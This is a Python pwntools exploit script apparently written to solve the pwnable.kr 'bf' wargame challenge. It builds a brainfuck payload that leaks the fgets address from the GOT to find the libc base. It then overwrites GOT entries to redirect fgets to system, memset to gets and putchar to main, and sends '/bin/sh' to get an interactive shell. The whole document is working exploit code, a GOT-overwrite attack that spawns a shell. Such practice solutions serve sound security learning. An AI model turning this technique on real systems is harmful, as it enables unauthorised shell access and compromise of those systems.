from pwn import *


bflibc = ELF('./bf_libc.so')
lib_fgets = bflibc.symbols['fgets']
lib_system = bflibc.symbols['system']
lib_gets = bflibc.symbols['gets']

#connect the problem
conn = remote('pwnable.kr', 9001)
#receive the two tips lines
conn.recvlines(2)

#construct the brain-fuck instruction
payload = '<'*(0x804a0a0-0x804a010)#move to got.plt.fgets 

payload += '.>'*4 #print fgets offet

payload += '<'*4  #move to got.plt.fgets

payload += ',>'*4 #change fgets offset to system

payload += '>'*(0x804a02c-0x804a014) #move to got.plt.memset

payload += ',>'*4 #change memset offset to gets

payload += ',>'*4 #change putchar offet to main

payload += '.' #putchar

print payload
conn.sendline(payload)

fgets_offset = conn.recvn(4)[::-1].encode('hex') #fgets offset

print fgets_offset
lib_base = int(fgets_offset,16) - lib_fgets

print lib_base

_gets = p32(lib_base+lib_gets)
_system = p32(lib_base+lib_system)
_main = p32(0x08048671)

conn.send(_system)
conn.send(_gets)
conn.send(_main)
conn.sendline('/bin/sh')

conn.interactive()
